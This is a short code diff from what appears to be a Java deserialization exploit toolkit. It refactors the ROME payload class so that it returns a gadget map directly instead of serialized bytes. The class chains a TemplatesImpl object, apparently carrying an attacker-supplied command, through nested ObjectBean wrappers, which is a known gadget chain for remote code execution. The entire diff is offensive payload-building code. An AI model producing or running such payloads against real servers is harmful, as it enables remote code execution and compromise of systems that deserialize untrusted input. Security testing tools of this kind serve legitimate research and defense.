@@ -26,21 +26,10 @@ import java.io.ObjectOutputStream;
  */
 public class ROME implements ObjectPayload<Object> {
     @Override
-    public byte[] getBytes(PayloadType type, String... param) throws Exception {
+    public Object getObject(PayloadType type, String... param) throws Exception {
         Object                o        = Gadgets.createTemplatesImpl(type, param);
         ObjectBean            delegate = new ObjectBean(Templates.class, o);
         ObjectBean            root     = new ObjectBean(ObjectBean.class, delegate);
-        ByteArrayOutputStream baous    = new ByteArrayOutputStream();
-        ObjectOutputStream    oos      = new ObjectOutputStream(baous);
-        oos.writeObject(Gadgets.makeMap(root, root));
-        byte[] bytes = baous.toByteArray();
-        oos.close();
-
-        return bytes;
-    }
-
-    @Override
-    public Object getObject(String command) throws Exception {
-        return null;
+        return Gadgets.makeMap(root, root);
     }
 }
